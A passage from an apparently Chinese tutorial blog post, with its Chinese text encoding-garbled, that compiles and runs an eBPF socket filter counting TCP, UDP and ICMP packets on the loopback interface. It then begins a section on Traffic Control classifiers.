class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/udp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> offsetof</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> offsetof(TYPE, MEMBER) ((size_t) &amp; ((TYPE *)0)-&gt;MEMBER)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEC(NAME) __attribute__((section(NAME), used)) </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_def</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> type;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> key_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> value_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> max_entries;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> map_flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*bpf_map_update_elem)</span><span class="params">(struct bpf_map_def *<span class="built_in">map</span>, <span class="keyword">void</span> *key,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">void</span> *value, __u64 flags)</span> </span>= (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_map_update_elem;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *(*bpf_map_lookup_elem)(struct bpf_map_def *<span class="built_in">map</span>, <span class="keyword">void</span> *key) =</span><br><span class="line">    (<span class="keyword">void</span> *)BPF_FUNC_map_lookup_elem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">load_byte</span><span class="params">(<span class="keyword">void</span> *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> off)</span> <span class="title">asm</span><span class="params">(<span class="string">"llvm.bpf.load.byte"</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> countmap </span>= &#123;</span><br><span class="line">    .type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">    .max_entries = <span class="number">256</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SEC(<span class="string">"socket"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket_prog</span><span class="params">(struct __sk_buff *skb)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> proto = load_byte(skb, ETH_HLEN + offsetof(struct iphdr, protocol));</span><br><span class="line">  <span class="keyword">int</span> one = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> *el = bpf_map_lookup_elem(&amp;countmap, &amp;proto);</span><br><span class="line">  <span class="keyword">if</span> (el) &#123;</span><br><span class="line">    (*el)++;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    el = &amp;one;</span><br><span class="line">  &#125;</span><br><span class="line">  bpf_map_update_elem(&amp;countmap, &amp;proto, el, BPF_ANY);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> _license[] SEC(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# clang -O2 -target bpf -c bpf_program.c -o bpf_program.o</span><br></pre></td></tr></table></figure><p>æŠ¥é”™å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# clang -O2 -target bpf -c bpf_program.c -o bpf_program.o</span><br><span class="line">In file included from bpf_program.c:6:</span><br><span class="line">In file included from /usr/include/linux/string.h:7:</span><br><span class="line">In file included from /usr/include/string.h:26:</span><br><span class="line">In file included from /usr/include/bits/libc-header-start.h:33:</span><br><span class="line">In file included from /usr/include/features.h:452:</span><br><span class="line">/usr/include/gnu/stubs.h:7:11: fatal error: 'gnu/stubs-32.h' file not found</span><br><span class="line"><span class="meta">#</span><span class="bash"> include &lt;gnu/stubs-32.h&gt;</span></span><br><span class="line">          ^~~~~~~~~~~~~~~~</span><br><span class="line">1 error generated.</span><br></pre></td></tr></table></figure><p>è§£å†³åŠæ³•å¦‚ä¸‹</p><p><a href="https://github.com/cilium/cilium/issues/368" target="_blank" rel="noopener">https://github.com/cilium/cilium/issues/368</a></p><p>é‡æ–°ç¼–è¯‘</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# clang -O2 -target bpf -c bpf_program.c -o bpf_program.o</span><br></pre></td></tr></table></figure><h5 id="åŠ è½½å¹¶é™„åŠ åˆ°ç½‘ç»œæ¥å£"><a href="#åŠ è½½å¹¶é™„åŠ åˆ°ç½‘ç»œæ¥å£" class="headerlink" title="åŠ è½½å¹¶é™„åŠ åˆ°ç½‘ç»œæ¥å£"></a>åŠ è½½å¹¶é™„åŠ åˆ°ç½‘ç»œæ¥å£</h5><p>åŠ è½½ç¨‹åºæ˜¯å®é™…æ‰“å¼€æˆ‘ä»¬ç¼–è¯‘çš„BPF ELFäºŒè¿›åˆ¶æ–‡ä»¶<code>bpf_program.o</code>çš„ç¨‹åºï¼Œå¹¶å°†å®šä¹‰çš„BPFç¨‹åºåŠå…¶æ˜ å°„é™„åŠ åˆ°ä¸€ä¸ªå¥—æ¥å­—ï¼Œè¯¥å¥—æ¥å­—æ˜¯é’ˆå¯¹æ‰€è§‚å¯Ÿçš„æ¥å£åˆ›å»ºçš„ï¼Œåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­æ˜¯ç¯å›æ¥å£ã€‚</p><p>loaderæœ€é‡è¦çš„éƒ¨åˆ†æ˜¯ELFæ–‡ä»¶çš„åŠ è½½ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (load_bpf_file(filename)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, bpf_log_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  sock = open_raw_sock(<span class="string">"lo"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (setsockopt(sock, SOL_SOCKET, SO_ATTACH_BPF, prog_fd,</span><br><span class="line">                 <span class="keyword">sizeof</span>(prog_fd[<span class="number">0</span>]))) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"setsockopt %s\n"</span>, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è¿™å°†é€šè¿‡æ·»åŠ ä¸€ä¸ªå…ƒç´ æ¥å¡«å……<code>prog_fd</code>æ•°ç»„ï¼Œè¯¥å…ƒç´ æ˜¯æˆ‘ä»¬åŠ è½½çš„ç¨‹åºçš„æ–‡ä»¶æè¿°ç¬¦ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥å°†å…¶é™„åŠ åˆ°ä½¿ç”¨<code>open_raw_sock</code>æ‰“å¼€çš„ç¯å›æ¥å£çš„å¥—æ¥å­—æè¿°ç¬¦ä¸Šã€‚</p><p>é€šè¿‡å°†é€‰é¡¹<code>SO_ATTACH_BPF</code>è®¾ç½®ä¸ºä¸ºæ¥å£æ‰“å¼€çš„åŸå§‹å¥—æ¥å­—æ¥å®Œæˆé™„åŠ ã€‚</p><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬çš„ç”¨æˆ·ç©ºé—´åŠ è½½å™¨èƒ½å¤Ÿåœ¨å†…æ ¸å‘é€æ˜ å°„å…ƒç´ æ—¶æŸ¥æ‰¾å®ƒä»¬ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    key = IPPROTO_TCP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;tcp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    key = IPPROTO_UDP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;udp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    key = IPPROTO_ICMP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;icmp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"TCP %d UDP %d ICMP %d packets\n"</span>, tcp_cnt, udp_cnt, icmp_cnt);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ä¸ºäº†è¿›è¡ŒæŸ¥æ‰¾ï¼Œæˆ‘ä»¬ä½¿ç”¨forå¾ªç¯å’Œ<code>bpf_map_look_elem</code>é™„åŠ åˆ°æ•°ç»„æ˜ å°„ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥åˆ†åˆ«è¯»å–å’Œæ‰“å°TCPã€UDPå’ŒICMPæ•°æ®åŒ…è®¡æ•°å™¨çš„å€¼</p><p><code>loader.c</code>ç¨‹åºå®Œæ•´ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bpf/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bpf/bpf_load.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bpf/sock_example.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bpf_log_buf[BPF_LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sock = <span class="number">-1</span>, i, key;</span><br><span class="line">  <span class="keyword">int</span> tcp_cnt, udp_cnt, icmp_cnt;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> filename[<span class="number">256</span>];</span><br><span class="line">  <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"%s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (load_bpf_file(filename)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, bpf_log_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  sock = open_raw_sock(<span class="string">"lo"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (setsockopt(sock, SOL_SOCKET, SO_ATTACH_BPF, prog_fd,</span><br><span class="line">                 <span class="keyword">sizeof</span>(prog_fd[<span class="number">0</span>]))) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"setsockopt %s\n"</span>, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    key = IPPROTO_TCP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;tcp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    key = IPPROTO_UDP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;udp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    key = IPPROTO_ICMP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;icmp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"TCP %d UDP %d ICMP %d packets\n"</span>, tcp_cnt, udp_cnt, icmp_cnt);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿™ä¸ªç¨‹åºä½¿ç”¨çš„æ˜¯<code>libbpf</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ä¸‹è½½çš„æºç ä¸­ç¼–è¯‘å®ƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# pwd</span><br><span class="line">/root/linux-5.4/tools/lib/bpf</span><br><span class="line">[root@VM-16-14-centos bpf]# make</span><br><span class="line">Auto-detecting system features:</span><br><span class="line">...                        libelf: [ on  ]</span><br><span class="line">...                           bpf: [ on  ]</span><br><span class="line"></span><br><span class="line">  HOSTCC   fixdep.o</span><br><span class="line">  HOSTLD   fixdep-in.o</span><br><span class="line">  LINK     fixdep</span><br><span class="line">  MKDIR    staticobjs/</span><br></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹è„šæœ¬ç¼–è¯‘åŠ è½½å™¨ï¼š</p><p><code>build-loader.sh</code>ä»£ç å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KERNEL_SRCTREE=$1</span><br><span class="line">LIBBPF=$&#123;KERNEL_SRCTREE&#125;/tools/lib/bpf/libbpf.a</span><br><span class="line">clang -o loader-bin -I$&#123;KERNEL_SRCTREE&#125;/tools/lib/bpf/ \</span><br><span class="line"><span class="meta">  -I$</span><span class="bash">&#123;KERNEL_SRCTREE&#125;/tools/lib -I<span class="variable">$&#123;KERNEL_SRCTREE&#125;</span>/tools/include \</span></span><br><span class="line"><span class="meta">  -I$</span><span class="bash">&#123;KERNEL_SRCTREE&#125;/tools/perf -I<span class="variable">$&#123;KERNEL_SRCTREE&#125;</span>/samples \</span></span><br><span class="line"><span class="meta">  $</span><span class="bash">&#123;KERNEL_SRCTREE&#125;/samples/bpf/bpf_load.c \</span></span><br><span class="line">  loader.c "$&#123;LIBBPF&#125;" -lelf</span><br></pre></td></tr></table></figure><p>è¯¥è„šæœ¬åŒ…å«ä¸€å †å¤´æ–‡ä»¶å’Œå†…æ ¸æœ¬èº«çš„<code>libbpf</code>åº“ï¼Œå› æ­¤å®ƒå¿…é¡»çŸ¥é“åœ¨å“ªé‡Œå¯ä»¥æ‰¾åˆ°å†…æ ¸æºç ã€‚ ä¸ºæ­¤å¯ä»¥åœ¨å…¶ä¸­æ›¿æ¢<code>$KERNEL_SRCTREE</code>æˆ–å°†è¯¥è„šæœ¬å†™å…¥æ–‡ä»¶å¹¶ä½¿ç”¨å®ƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ./build-loader.sh /root/linux-5.4</span><br></pre></td></tr></table></figure><p>æŠ¥é”™å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp/loader-19267c.o:(.bss+0x0): multiple definition of `bpf_log_buf&apos;</span><br><span class="line">/tmp/bpf_load-33a95f.o:(.bss+0x1000): first defined here</span><br><span class="line">clang-12: error: linker command failed with exit code 1 (use -v to see invocation)</span><br></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•å¦‚ä¸‹</p><p><a href="https://stackoverflow.com/questions/12511044/bss0x0-multiple-definition-of-proxies" target="_blank" rel="noopener">https://stackoverflow.com/questions/12511044/bss0x0-multiple-definition-of-proxies</a></p><p>å³åœ¨å…¨å±€å˜é‡å‰å£°æ˜<code>extern</code>ï¼Œè¿™é‡Œæˆ‘ä»¬åœ¨<code>char bpf_log_buf[BPF_LOG_BUF_SIZE]</code>å¤„å£°æ˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> bpf_log_buf[BPF_LOG_BUF_SIZE];</span><br></pre></td></tr></table></figure><p>ä¹‹åé‡æ–°ç¼–è¯‘ä¼šåˆ›å»ºä¸€ä¸ª<code>loader-bin</code>æ–‡ä»¶ï¼Œæœ€ç»ˆå¯ä»¥å¯åŠ¨BPFç¨‹åºçš„ELFæ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ./loader-bin bpf_program.o</span><br></pre></td></tr></table></figure><p>ç¨‹åºåŠ è½½å¹¶å¯åŠ¨åï¼Œå°†æ‰§è¡Œ10æ¬¡è½¬å‚¨ï¼Œæ¯ç§’ä¸€æ¬¡æ˜¾ç¤ºä¸‰ä¸ªåè®®ä¸­çš„æ¯ä¸€ä¸ªçš„æ•°æ®åŒ…è®¡æ•°ã€‚å› ä¸ºç¨‹åºè¿æ¥åˆ°ç¯å›è®¾å¤‡<code>lo</code>ï¼Œæ‰€ä»¥ä½ å¯ä»¥ä¸åŠ è½½ç¨‹åºä¸€èµ·è¿è¡Œpingå¹¶çœ‹åˆ°ICMPè®¡æ•°å™¨å¢åŠ ã€‚</p><p>è¿è¡Œpingæ¥ç”Ÿæˆåˆ°<code>localhost</code>çš„ICMPæµé‡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ping -c 100 127.0.0.1</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.100 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.107 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.093 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.102 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=5 ttl=64 time=0.105 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=6 ttl=64 time=0.093 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=7 ttl=64 time=0.104 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=8 ttl=64 time=0.142 ms</span><br></pre></td></tr></table></figure><p>åœ¨å¦ä¸€ä¸ªç»ˆç«¯ä¸­è¿è¡Œæˆ‘ä»¬çš„BPFç¨‹åºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ./loader-bin bpf_program.o</span><br><span class="line"> TCP 0 UDP 0 ICMP 0 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 4 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 8 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 12 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 16 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 20 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 24 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 28 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 32 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 36 packets</span><br></pre></td></tr></table></figure><h3 id="åŸºäºBPFçš„æµé‡æ§åˆ¶åˆ†ç±»å™¨"><a href="#åŸºäºBPFçš„æµé‡æ§åˆ¶åˆ†ç±»å™¨" class="headerlink" title="åŸºäºBPFçš„æµé‡æ§åˆ¶åˆ†ç±»å™¨"></a>åŸºäºBPFçš„æµé‡æ§åˆ¶åˆ†ç±»å™¨</h3><p>æµé‡æ§åˆ¶æ˜¯å†…æ ¸æ•°æ®åŒ…è°ƒåº¦å­ç³»ç»Ÿæ¶æ„ã€‚ç”±å†³å®šæ•°æ®åŒ…å¦‚ä½•æµåŠ¨ä»¥åŠå¦‚ä½•è¢«æ¥å—çš„æœºåˆ¶å’Œæ’é˜Ÿç³»ç»Ÿç»„æˆã€‚æµé‡æ§åˆ¶çš„ä¸€äº›ç”¨ä¾‹åŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>ä¼˜å…ˆå¤„ç†æŸäº›ç±»å‹çš„æ•°æ®åŒ…</li><li>ä¸¢å¼ƒç‰¹å®šç±»å‹çš„æ•°æ®åŒ…</li><li>å¸¦å®½åˆ†é…</li></ul><p>ä¸€èˆ¬æ¥è¯´ï¼Œå½“ä½ éœ€è¦é‡æ–°åˆ†é…ç³»ç»Ÿä¸­çš„ç½‘ç»œèµ„æºæ—¶ï¼Œæµé‡æ§åˆ¶æ˜¯ä¸€ç§å¯è¡Œçš„æ–¹æ³•ï¼Œä¸ºäº†å……åˆ†åˆ©ç”¨å®ƒï¼Œåº”è¯¥æ ¹æ®ä½ æƒ³è¦è¿è¡Œçš„åº”ç”¨ç¨‹åºç±»å‹éƒ¨ç½²ç‰¹å®šçš„æµé‡æ§åˆ¶é…ç½®ã€‚æµé‡æ§åˆ¶æä¾›äº†ä¸€ä¸ªå¯ç¼–ç¨‹çš„åˆ†ç±»å™¨ï¼Œç§°ä¸º<code>cls_bpf</code>ï¼Œè®©é’©å­è¿›å…¥ä¸åŒçº§åˆ«çš„è°ƒåº¦æ“ä½œï¼Œå®ƒä»¬å¯ä»¥è¯»å–å’Œæ›´æ–°å¥—æ¥å­—ç¼“å†²åŒºå’Œæ•°æ®åŒ…å…ƒæ•°æ®ï¼Œä»¥æ‰§è¡Œæµé‡æ•´å½¢ã€è·Ÿè¸ªã€é¢„å¤„ç†ç­‰æ“ä½œã€‚</p><p><code>cls_bpf</code>ä¸­å¯¹eBPFçš„æ”¯æŒæ˜¯åœ¨å†…æ ¸4.1ä¸­å®ç°çš„ï¼Œè¿™æ„å‘³ç€è¿™ç§ç¨‹åºå¯ä»¥è®¿é—®eBPFæ˜ å°„ï¼Œæ”¯æŒå°¾è°ƒç”¨ï¼Œå¯ä»¥è®¿é—®<code>IPv4/IPv6</code>éš§é“å…ƒæ•°æ®ï¼Œå¹¶ä¸”é€šå¸¸ä½¿ç”¨eBPFé™„å¸¦çš„å¸®åŠ©ç¨‹åºå’Œå®ç”¨ç¨‹åºã€‚</p><p>ç”¨äºä¸æµé‡æ§åˆ¶ç›¸å…³çš„ç½‘ç»œé…ç½®è¿›è¡Œäº¤äº’çš„å·¥å…·æ˜¯<code>iproute2</code>å¥—ä»¶çš„ä¸€éƒ¨åˆ†ï¼Œå…¶ä¸­åŒ…å«ipå’Œtcï¼Œå®ƒä»¬åˆ†åˆ«ç”¨äºæ“ä½œç½‘ç»œæ¥å£å’Œæµé‡æ§åˆ¶é…ç½®ã€‚</p><h4 id="æœ¯è¯­"><a href="#æœ¯è¯­" class="headerlink" title="æœ¯è¯­"></a>æœ¯è¯­</h4><p>å¦‚å‰æ‰€è¿°ï¼Œ<code>Traffic Control</code>å’ŒBPFç¨‹åºä¹‹é—´å­˜åœ¨äº¤äº’ç‚¹ï¼Œå› æ­¤ä½ éœ€è¦äº†è§£ä¸€äº›<code>Traffic Control</code>æ¦‚å¿µã€‚ å¦‚æœä½ å·²ç»æŒæ¡ç›¸å…³æœ¯è¯­ï¼Œè¯·ç›´æ¥è¿›å…¥ç¤ºä¾‹ã€‚</p><h5 id="Queueing-disciplines"><a href="#Queueing-disciplines" class="headerlink" title="Queueing disciplines"></a>Queueing disciplines</h5><p>æ’é˜Ÿè§„åˆ™(qdisc)å®šä¹‰äº†è°ƒåº¦å¯¹è±¡ï¼Œé€šè¿‡æ›´æ”¹å‘é€æ–¹å¼å¯¹è¿›å…¥æ¥å£çš„æ•°æ®åŒ…æ’é˜Ÿï¼›è¿™äº›å¯¹è±¡å¯ä»¥æ˜¯æ— ç±»çš„æˆ–æœ‰ç±»çš„ã€‚</p><p>é»˜è®¤çš„<code>qdisc</code>æ˜¯<code>pfifo_fast</code>ï¼Œå®ƒæ˜¯æ— 